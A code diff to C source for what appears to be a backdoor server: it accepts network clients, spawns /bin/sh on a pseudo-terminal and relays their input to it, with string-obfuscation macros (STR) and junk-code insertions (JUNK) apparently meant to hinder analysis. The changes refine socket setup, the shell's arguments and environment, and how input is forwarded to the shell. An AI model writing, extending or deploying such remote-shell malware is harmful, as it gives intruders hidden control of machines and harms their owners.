@@ -51,7 +51,7 @@ static int setblocking(int fd)
 
 static int create_server(void)
 {
-	int fd = socket(AF_INET, SOCK_STREAM, 0);
+	int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC | SOCK_NONBLOCK, 0);
 	if (fd == -1) {
 		return -1;
 	} JUNK;
@@ -76,11 +76,6 @@ static int create_server(void)
 		close(fd);
 		return -1;
 	}
-
-	if (setnonblocking(fd) < 0) {
-		close(fd);
-		return -1;
-	} JUNK;
 
 	return fd;
 }
@@ -123,7 +118,9 @@ static int disable_echo(int slave_fd) {
 
 int exec_shell2(param_t *command)
 {
-	char *argv[] = {STR("/bin/sh"), STR("-i"), STR("+m"), NULL};
+	char *argv[] = {STR("/bin/sh"), NULL}; //, STR("-i"), STR("+m"), NULL};
+	//
+	//char *argv[] = {STR("/bin/bash"), STR("--noprofile"), STR("--norc"), NULL};
 	int slave_fd = -1;
 	client_t *client = command->client;
 	int epoll_fd = client->master_ev.epoll_fd;
@@ -139,7 +136,7 @@ int exec_shell2(param_t *command)
 		return -1;
 	} else if (pid == 0) {
 
-		slave_fd = open(client->pty_name, O_RDWR);
+		slave_fd = open(client->pty_name, O_RDWR | O_CLOEXEC);
 		if (slave_fd == -1) {
 			logger(STR("open slave failed\n"));
 			exit(1);
@@ -161,7 +158,7 @@ int exec_shell2(param_t *command)
 		} JUNK;
 
 		if (ioctl(slave_fd, TIOCSCTTY, NULL) == -1) {
-			logger(STR("ioctl failed\n"));
+			logger(STR("slave_fd TIOCSCTTY (set controlling terminal) failed\n"));
 			exit(1);
 		} JUNK;
 
@@ -169,7 +166,7 @@ int exec_shell2(param_t *command)
 		dup2(slave_fd, 1);
 		dup2(slave_fd, 2);
 
-		execve(argv[0], argv, command->envp);
+		execve(argv[0], argv, g_env);
 		exit(1);
 	}
 
@@ -271,8 +268,9 @@ void client_event(event_t *self, uint32_t events) {
 		if (client->shell_active == true) {
 			epoll_ctl(self->epoll_fd, EPOLL_CTL_DEL, client->master_ev.fd, NULL);
 			close(client->master_ev.fd);
-			client->shell_active = false;
 		}
+
+		ft_memset(client, 0, sizeof(client_t));
 
 		return;
 	} else if (events & EPOLLIN) {
@@ -298,15 +296,6 @@ void client_event(event_t *self, uint32_t events) {
 
 		ssize_t ret = read(self->fd, buf, sizeof(buf) - 1);
 
-		if (client->shell_active == true) {
-			logger(STR("client shell active, writing to master\n"));
-			if (ret > 0) {
-				buf[ret] = '\0';
-				write(client->master_ev.fd, buf, ret);
-			}
-			return;
-		}
-
 		if (ret == -1) {
 			logger(STR("read failed\n"));
 			return;
@@ -318,9 +307,15 @@ void client_event(event_t *self, uint32_t events) {
 			return;
 		} JUNK;
 
-		if (buf[ret - 1] == '\n') {
-			buf[ret - 1] = '\0';
+		if (client->shell_active == true && ret > 0) {
+			logger(STR("client shell active, writing to master\n"));
+			write(client->master_ev.fd, buf, ret);
+			return;
 		}
+
+		if (buf[ret - 1] == '\n')
+			buf[ret - 1] = '\0';
+		buf[ret] = '\0';
 
 		param_t command = {
 			.client = (client_t *)self->context,
